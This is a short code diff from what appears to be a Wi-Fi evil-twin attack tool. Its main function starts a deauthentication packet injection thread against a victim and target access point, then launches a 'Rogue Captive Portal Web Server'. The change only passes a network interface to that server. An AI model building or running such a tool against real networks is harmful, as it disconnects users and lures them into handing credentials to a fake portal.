@@ -80,7 +80,7 @@ def main():
         injection_thread = threading.Thread(target=send_disas_packets,args=(INJECT_INTERFACE,victim,target_ap,stop_injection), daemon=True)
         injection_thread.start()
         print("[+] Starting Rogue Captive Portal Web Server...")
-        flask_thread = threading.Thread(target=run_flask_server)
+        flask_thread = threading.Thread(target=run_flask_server, args=(EV_INTERFACE,))
         
         flask_thread.daemon = True 
         flask_thread.start()
